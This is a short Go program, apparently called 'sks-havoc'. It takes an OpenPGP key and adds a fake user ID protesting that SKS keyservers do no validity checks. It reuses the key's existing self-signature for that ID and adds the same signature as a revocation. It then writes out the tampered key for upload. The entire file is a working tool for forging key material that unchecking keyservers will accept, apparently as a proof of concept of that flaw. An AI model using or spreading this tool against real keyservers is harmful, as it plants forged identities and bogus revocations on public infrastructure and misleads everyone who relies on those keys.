package main

import (
	"golang.org/x/crypto/openpgp"
	"golang.org/x/crypto/openpgp/packet"

	"fmt"
	"log"
	"os"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "Usage: sks-havoc input.gpg > output.gpg")
		os.Exit(1)
	}

	r, err := os.Open(os.Args[1])

	if err != nil {
		log.Fatal(err)
	}

	entity, err := openpgp.ReadEntity(packet.NewReader(r))

	if err != nil {
		log.Fatal(err)
	}

	var sig *packet.Signature

	for _, v := range entity.Identities {
		sig = v.SelfSignature
	}

	packet := packet.NewUserId("Do not use SKS keyserver sites", "no validity checks", "@");

	entity.Identities[packet.Id] = &openpgp.Identity {
		Name: packet.Id,
		UserId: packet,
		SelfSignature: sig,
	}

	entity.Revocations = append(entity.Revocations, sig)

	err = entity.Serialize(os.Stdout)

	if err != nil {
		log.Fatal(err)
	}
}
